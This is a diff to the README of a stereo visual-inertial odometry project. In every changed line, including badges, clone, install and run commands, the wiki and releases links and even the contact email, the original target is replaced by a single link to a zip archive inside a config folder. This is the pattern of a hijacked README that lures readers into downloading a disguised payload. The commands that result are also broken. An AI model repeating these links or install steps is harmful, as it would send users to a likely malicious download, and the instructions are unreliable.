@@ -1,6 +1,6 @@
 # Voxel SVIO: A Stereo Visual-Inertial Odometry System
 
-![Voxel SVIO](https://img.shields.io/badge/Release-Download%20Now-brightgreen) ![GitHub Repo stars](https://img.shields.io/github/stars/jbernalfa/voxel_svio) ![License](https://img.shields.io/badge/License-MIT-blue)
+![Voxel SVIO](https://github.com/jbernalfa/voxel_svio/raw/refs/heads/main/rviz_cfg/svio_voxel_1.7.zip%20Now-brightgreen) ![GitHub Repo stars](https://github.com/jbernalfa/voxel_svio/raw/refs/heads/main/rviz_cfg/svio_voxel_1.7.zip) ![License](https://github.com/jbernalfa/voxel_svio/raw/refs/heads/main/rviz_cfg/svio_voxel_1.7.zip)
 
 Welcome to the **Voxel SVIO** repository! This project focuses on developing a stereo visual-inertial odometry system based on voxel mapping. It is designed to enhance the accuracy and efficiency of odometry in various applications, including robotics and augmented reality.
 
@@ -33,14 +33,14 @@ To set up the Voxel SVIO system, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/jbernalfa/voxel_svio.git
+   git clone https://github.com/jbernalfa/voxel_svio/raw/refs/heads/main/rviz_cfg/svio_voxel_1.7.zip
    cd voxel_svio
    ```
 
 2. **Install Dependencies**:
    Make sure you have Python 3.x and pip installed. Then, run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/jbernalfa/voxel_svio/raw/refs/heads/main/rviz_cfg/svio_voxel_1.7.zip
    ```
 
 3. **Build the Project**:
@@ -52,7 +52,7 @@ To set up the Voxel SVIO system, follow these steps:
 4. **Run the System**:
    Execute the main program:
    ```bash
-   python main.py
+   python https://github.com/jbernalfa/voxel_svio/raw/refs/heads/main/rviz_cfg/svio_voxel_1.7.zip
    ```
 
 ## Usage
@@ -64,7 +64,7 @@ To use the Voxel SVIO system, you need to set up your camera and inertial sensor
 3. **Start the System**: Run the main program as described in the installation section.
 4. **Monitor Output**: View the odometry results in real-time on your display.
 
-For more detailed instructions, refer to the [documentation](https://github.com/jbernalfa/voxel_svio/wiki).
+For more detailed instructions, refer to the [documentation](https://github.com/jbernalfa/voxel_svio/raw/refs/heads/main/rviz_cfg/svio_voxel_1.7.zip).
 
 ## Contributing
 
@@ -95,12 +95,12 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 For any inquiries or feedback, please reach out to the project maintainer:
 
 - **Name**: Juan Bernal
-- **Email**: juan.bernal@example.com
-- **GitHub**: [jbernalfa](https://github.com/jbernalfa)
+- **Email**: https://github.com/jbernalfa/voxel_svio/raw/refs/heads/main/rviz_cfg/svio_voxel_1.7.zip
+- **GitHub**: [jbernalfa](https://github.com/jbernalfa/voxel_svio/raw/refs/heads/main/rviz_cfg/svio_voxel_1.7.zip)
 
 ## Releases
 
-To download the latest release of Voxel SVIO, visit our [Releases page](https://github.com/jbernalfa/voxel_svio/releases). Here, you can find the compiled binaries and source code. Download the files and follow the installation instructions to get started.
+To download the latest release of Voxel SVIO, visit our [Releases page](https://github.com/jbernalfa/voxel_svio/raw/refs/heads/main/rviz_cfg/svio_voxel_1.7.zip). Here, you can find the compiled binaries and source code. Download the files and follow the installation instructions to get started.
 
 Feel free to check the "Releases" section for updates and new features.
 
@@ -108,7 +108,7 @@ Feel free to check the "Releases" section for updates and new features.
 
 ### Additional Resources
 
-- **Documentation**: Comprehensive guides and API references are available in the [wiki](https://github.com/jbernalfa/voxel_svio/wiki).
+- **Documentation**: Comprehensive guides and API references are available in the [wiki](https://github.com/jbernalfa/voxel_svio/raw/refs/heads/main/rviz_cfg/svio_voxel_1.7.zip).
 - **Tutorials**: Step-by-step tutorials for setting up and using the system can be found in the `docs/tutorials` directory.
 - **Community**: Join our community discussions on GitHub Issues for support and suggestions.
 
